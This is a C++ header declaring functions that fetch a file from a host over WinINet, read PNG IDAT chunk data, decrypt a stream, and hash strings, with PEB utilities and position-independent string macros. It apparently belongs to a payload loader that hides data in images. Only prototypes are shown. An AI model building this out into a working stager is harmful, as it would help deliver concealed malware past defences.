#pragma once

#include <Windows.h>
#include <wininet.h>
#include <vector>
//#include <iostream>
#include "PebUtils.h"


using namespace std;

// from https://gist.github.com/EvanMcBroom/d7f6a8fe3b4d8f511b132518b9cf80d7
#define PIC_STRING(NAME, STRING) constexpr char NAME[]{ STRING }
#define PIC_WSTRING(NAME, STRING) constexpr wchar_t NAME[]{ STRING }


ULONG sl(const char* str);
std::vector<char> FetchFileContents(const wchar_t* host, const wchar_t* useragent);	
std::vector<char> ReadPngIdat(std::vector<char> png_data);
std::vector<char> DecryptStream(std::vector<char> file_stream);